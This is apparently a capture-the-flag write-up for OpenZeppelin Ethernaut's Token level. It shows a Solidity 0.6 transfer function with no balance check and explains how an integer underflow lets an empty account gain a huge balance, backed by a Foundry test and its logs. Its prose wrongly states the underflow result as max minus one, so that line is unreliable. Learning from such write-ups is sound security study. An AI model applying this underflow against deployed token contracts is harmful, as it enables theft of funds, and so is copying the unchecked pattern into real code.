# What is OpenZeppelin Ethernaut?

OpenZeppelin Ethernaut is an educational platform that provides interactive and gamified challenges to help users learn about Ethereum smart contract security. It is developed by OpenZeppelin, a company known for its security audits, tools, and best practices in the blockchain and Ethereum ecosystem.

OpenZeppelin Ethernaut Website: [ethernaut.openzeppelin.com](ethernaut.openzeppelin.com)

<br>

# What You're Supposed to Do?

in `05-Token` Challenge, You Should Try To find a Way to Mint Yourself Alot of Tokens (kinda).

`05-Token` Challenge Link: [https://ethernaut.openzeppelin.com/level/0x478f3476358Eb166Cb7adE4666d04fbdDB56C407](https://ethernaut.openzeppelin.com/level/0x478f3476358Eb166Cb7adE4666d04fbdDB56C407)


<br>

# How did i Complete This Challenge?

This One is Simple. Since the Solidity Version of the Codebase is `^0.6.0`, it's Vulnerable to `Overflow/Underflow`, Unless We Use `SafeMath` Library from Openzeppelin Which we Clearly Didn't.

Now Lets take a Look at `transfer` function:


```javascript
    function transfer(address _to, uint256 _value) public returns (bool) {
            require(balances[msg.sender] - _value >= 0);
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            return true;
    }
```


first of all We dont Check if the `msg.sender` has enough tokens to transfer (something like this `require(balances[msg.sender] >= _value);`).

and lets say Attacker has Two External Owned Accounts (user1 and user2). 

Attacker Calls the `transfer` function with `user1` and Sends `10e18` to `user2`. (`msg.sender` == `user1`, `_to` == `user2`, `_value` == `10e18`)

Lets go Through the `transfer` function Line by Line with Above Values and Parameters:

```javascript
    require(balances[msg.sender] - _value >= 0);
    require(0 - 10e18 >= 0);
```

Since We Use `^0.6.0` Solidity Version, the Math Equation of `0 - 10e18` will underflow and the result will be: `require(type(uint256).max - 1  >= 0)` which will clearly pass.

then Lets Take a Look at Next Two Lines:

```javascript
    balances[msg.sender] -= _value;
  // 0 -= 10e18 will result in: type(uint256).max - 1 (user1 balance)

    balances[_to] += _value;
  // 0 += 10e18 will result in: 10e18 (user2 balance)
```

And This is How You Can Solve `05-Token` Challenge from Openzeppelin Ethernaut!

by the Way i Also Wrote Test for it, named as `testTransferfunction` inside the `Token.t.sol` file:

```javascript
    function testTransferfunction() external {
        vm.startPrank(userOne);
        token.transfer(userTwo, 10e18);
        assertEq(token.balanceOf(userTwo), 10e18);
        assertEq(token.balanceOf(userOne), (type(uint256).max - 10e18) + 1);
        vm.stopPrank();

        console.log("Balance of User1: ", token.balanceOf(userOne));
        console.log("Balance of User2: ", token.balanceOf(userTwo));
    }
```

You Can Run the Test With Following Command in Your Terminal: (Required to Have Foundry Installed.)

```javascript
    forge test --match-test testTransferfunction -vvvv
```

Output of the `Logs`:

```javascript
    Logs:
        Balance of User1:  115792089237316195423570985008687907853269984665640564039447584007913129639936
        Balance of User2:  10000000000000000000
```
